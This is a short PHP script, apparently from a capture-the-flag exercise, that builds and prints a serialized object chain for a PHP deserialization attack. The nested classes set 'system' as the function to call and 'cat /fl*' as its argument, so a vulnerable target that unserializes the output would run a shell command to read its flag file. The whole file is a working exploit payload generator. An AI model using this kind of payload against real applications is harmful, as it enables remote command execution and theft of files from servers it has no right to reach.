<?php
class D1 {
    public $test1;
    public $test2;
    
    public function __construct() {
        $this->test1 = "system";
        $this->test2 = "cat /fl*";
    }
}
class C1 {
    public $test1;
    
    public function __construct() {
        $this->test1 = new D1();
    }
}
// echo serialize(new C1());
$c = new C1();
$a = array(11,$c);
echo serialize($a);